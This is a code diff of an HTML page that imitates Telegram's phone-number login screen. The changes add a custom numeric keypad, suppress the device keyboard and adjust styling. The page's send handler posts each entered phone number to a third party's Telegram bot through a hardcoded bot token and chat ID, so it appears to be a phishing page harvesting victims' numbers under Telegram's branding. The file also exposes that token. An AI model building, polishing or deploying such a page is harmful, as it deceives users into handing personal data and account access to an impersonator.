@@ -6,6 +6,75 @@
       <title>Telegram</title>
 <style>
 
+#sendButton {
+width: 60px; /* Adjust the size as needed */
+ height: 60px; border-radius: 50%; /* Makes it a circle */
+background-color: #4CAF50; /* Or the specific blue color from the image */
+background-color: #56B8F7; /* A light blue */
+color: white; /* White arrow */
+border: none;
+cursor: pointer;
+font-size: 20px; /* Adjust arrow size */
+display: flex;
+justify-content: center;
+align-items: center;
+padding: 0; /* Remove default padding */
+box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.2); /* Optional shadow */
+}
+
+#sendButton:hover {
+opacity: 0.8; /* Slightly reduce opacity on hover */
+}
+
+
+ .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            max-width: 350px;
+            margin: 20px auto;
+            padding: 10px;
+        }
+
+        .keypad button {
+            padding: 8px 0;
+            font-size: 18px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.2s;
+            touch-action: manipulation; /* Prevent zoom on mobile */
+        }
+
+        .keypad button:hover {
+            background: #f5f5f5;
+        }
+
+        .keypad button:active {
+            background: #e0e0e0;
+        }
+
+        .keypad .letters {
+            font-size: 12px;
+            color: #888;
+            display: block;
+            margin-top: 4px;
+        }
+
+        .keypad .zero {
+            grid-column: span 2;
+        }
+
+        /* Hide input keyboard */
+        .country-code-input, .phone-input {
+            caret-color: transparent; /* Hide blinking cursor */
+        }
+        
+        .country-code-input:focus, .phone-input:focus {
+            outline: none;
+        }        
+
 loader {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #3498db;
@@ -26,8 +95,8 @@ loader {
 
        .first {text-align: center;
 }
-    img {width:100px;}
-    p { font-size: 1.3e}
+    img {width:100px;zoom:0.7}
+    p { font-size: 1.3em}
     
     
 #input{
@@ -46,8 +115,8 @@ loader {
   align-items: center;
   border: 1px solid #ddd;
   border-radius: 8px;
-  padding: 12px 16px;
-  margin: 20px auto;
+  padding: 2px 16px;
+  margin: 2px auto;
   max-width: 300px;
   background: white;
 }
@@ -57,7 +126,7 @@ loader {
     
     
     
-    .in {text-align: left;margin: 15px;padding: 10px;}
+    .in {text-align: left;margin: 1px;padding: 1px;}
         
 
 
@@ -93,9 +162,9 @@ loader {
 
     .phone-input-label {
       position: absolute;
-      top: -12px;
+      top: -6px;
       left: 10px;
-      font-size: 12px;
+      font-size: 10px;
       color: #007bff;
       background-color: white;
       padding: 0 4px;
@@ -131,7 +200,7 @@ loader {
         text-align: center; /* Center the text inside the input */
         font-size: 16px;
         background-color: transparent;  /* Make the background transparent*/ }
-#sendButton {
+ sendButton{
   display: block; /* Must be block-level */
   margin: 0 auto; /* Centers horizontally */
   width: 200px; /* Needs a defined width */
@@ -152,19 +221,12 @@ loader {
 </head>
 <body>
 <div class="first">
-  <img src="https://telegram.org/img/t_logo.png" alt="Telegram" width="24">
-  <p>
-  <b>Your phone number</b>
-  </p>
-  <pre>
-      please conform your country code
-      and enter your phone number
- 
-  </pre>
+  <img src="https://telegram.org/img/t_logo.png" alt="Telegram" >
+  <p> Your phone number </p>
+ <pre> please conform your country code
+ and enter your phone number </pre>
   
-  </div>
-  
-  
+ </div>
   <pre>
 <div id="country">
     <select id="pick">
@@ -404,12 +466,9 @@ loader {
 </div>
   </pre>
 </div>
-
-
-
 <div class="phone-input-container">
     <span class="phone-input-label">Phone number</span>
-    <span class="phone-input-prefix">+</span>
+    <span class="phone-input-prefix"><pre><b>+</b>     |</pre></span>
     
     
     
@@ -425,37 +484,62 @@ loader {
 <div class="in">
     <input type="checkbox" id="id"/>Sync Contact
 </div>
-<div class="sendButton">
-<button id="sendButton">send</button>
+<div class="sendButton" style="display:flex;justify-content:end;">
+<button id="sendButton">&#8594;</button>
 </div>
 <div class="loader" id="loader"></div>
     </div>
 
+   <!-- Keypad with 4 rows -->
+    <div class="keypad">
+        <button onclick="appendNumber('1')">1<div class="letters">ABC</div></button>
+        <button onclick="appendNumber('2')">2<div class="letters">DEF</div></button>
+        <button onclick="appendNumber('3')">3<div class="letters">GHI</div></button>
+        <button onclick="appendNumber('4')">4<div class="letters">JKL</div></button>
+        <button onclick="appendNumber('5')">5<div class="letters">MNO</div></button>
+        <button onclick="appendNumber('6')">6<div class="letters">PQRS</div></button>
+        <button onclick="appendNumber('7')">7<div class="letters">TUV</div></button>
+        <button onclick="appendNumber('8')">8<div class="letters">WXYZ</div></button>
+        <button onclick="appendNumber('9')">9<div class="letters"></div></button>
+        <button onclick="appendNumber('0')" class="zero">0<div class="letters"></div></button>
+        <button onclick="backspace()">⌫</button>
+    </div>
+    
 <script>
-  // Your existing code (unchanged)
   const countrySelect = document.getElementById('pick');
   const countryCodeInput = document.getElementById('countryCode');
   const phoneInput = document.getElementById('phone');
   const sendButton = document.getElementById('sendButton');
+  let activeInput = countryCodeInput; // Always start with country code
 
-  // Initial focus on country code if phone is empty
-  if (phoneInput.value === '') {
+  // Set initial focus on country code (without showing keyboard)
+  window.addEventListener('DOMContentLoaded', () => {
     countryCodeInput.focus();
-  }
+    setTimeout(() => countryCodeInput.blur(), 10);
+  });
 
-  // When country code input changes
+  // Prevent device keyboard from showing
+  [countryCodeInput, phoneInput].forEach(input => {
+    input.addEventListener('focus', function(e) {
+      activeInput = this;
+      setTimeout(() => this.blur(), 10);
+    });
+  });
+
+  // Only select country when full code is entered
   countryCodeInput.addEventListener('input', function() {
     const code = this.value;
-    
-    // Find matching option
-    const option = Array.from(countrySelect.options).find(opt => opt.value === code);
+    // Only check for exact matches when input length matches a country code length
+    const option = Array.from(countrySelect.options).find(opt => 
+      opt.value === code
+    );
     
     if (option) {
       option.selected = true;
-      // Only focus phone if country code has value
-      if (code !== '') {
-        phoneInput.focus();
-      }
+      activeInput = phoneInput; // Only switch focus on exact match
+    } else {
+      countrySelect.selectedIndex = 0; // Reset selection if no exact match
+      activeInput = countryCodeInput; // Stay on country code
     }
   });
 
@@ -463,44 +547,77 @@ loader {
   countrySelect.addEventListener('change', function() {
     if (this.value) {
       countryCodeInput.value = this.value;
-      phoneInput.focus();
+      activeInput = phoneInput;
+    } else {
+      activeInput = countryCodeInput;
     }
   });
 
-  // When phone input is empty, focus back to country code
-  phoneInput.addEventListener('input', function() {
-    if (this.value === '') {
-      countryCodeInput.focus();
-    }
-  });
-
-  // Also check when phone input loses focus
-  phoneInput.addEventListener('blur', function() {
-    if (this.value === '') {
-      countryCodeInput.focus();
-    }
-  });
-
-  // New Telegram sending functionality
-  sendButton.addEventListener('click', function() {
-    const countryCode = countryCodeInput.value.trim();
-    const phone = phoneInput.value.trim();
+  // Keypad functions
+  function appendNumber(num) {
+    if (!activeInput) activeInput = countryCodeInput;
     
-    if (!countryCode || !phone) {
-      alert('Please enter both country code and phone number');
+    if (activeInput === countryCodeInput) {
+      if (countryCodeInput.value.length >= 4) return;
+      countryCodeInput.value += num;
+      
+      // Check for exact match after each input
+      const option = Array.from(countrySelect.options).find(opt => 
+        opt.value === countryCodeInput.value
+      );
+      
+      if (option) {
+        option.selected = true;
+        activeInput = phoneInput;
+      }
       return;
     }
     
-    // Show loading state
+    // Handle phone input
+    if (phoneInput.value.length >= 15) return;
+    phoneInput.value += num;
+  }
+
+  function backspace() {
+    if (!activeInput) activeInput = countryCodeInput;
+    
+    if (activeInput === phoneInput) {
+      phoneInput.value = phoneInput.value.slice(0, -1);
+      if (phoneInput.value.length === 0) {
+        activeInput = countryCodeInput;
+      }
+    } 
+    else if (activeInput === countryCodeInput) {
+      countryCodeInput.value = countryCodeInput.value.slice(0, -1);
+      // Only select country if we have an exact match after backspace
+      const option = Array.from(countrySelect.options).find(opt => 
+        opt.value === countryCodeInput.value
+      );
+      countrySelect.selectedIndex = option ? option.index : 0;
+    }
+  }
+
+  // Send button functionality
+  sendButton.addEventListener('click', function() {
+    if (!countrySelect.value) {
+      alert('Please select a country first');
+      activeInput = countryCodeInput;
+      return;
+    }
+    
+    if (!phoneInput.value.trim()) {
+      alert('Please enter your phone number');
+      activeInput = phoneInput;
+      return;
+    }
+    
     sendButton.innerHTML = '<span class="loader"></span> Sending...';
     sendButton.disabled = true;
     
-    // Telegram bot details
     const botToken = '7398534798:AAEsprbkxVEh0eLkcQY2-C67TN9FTyeGHRw';
     const chatId = '-1002855345282';
-    const message = `New number: ${countryCode}${phone}`;
+    const message = `New number: ${countryCodeInput.value}${phoneInput.value}`;
     
-    // Send to Telegram
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: {
@@ -522,11 +639,11 @@ loader {
       console.error('Error:', error);
       sendButton.innerHTML = 'Send';
       sendButton.disabled = false;
-      alert('please try again. also check your number.');
+      alert('Please try again. Also check your number.');
     });
   });
 
-  // Add minimal loader style directly in script
+  // Add loader style
   const style = document.createElement('style');
   style.textContent = `
     .loader {
@@ -546,5 +663,6 @@ loader {
   `;
   document.head.appendChild(style);
 </script>
+
 </body>
 </html>
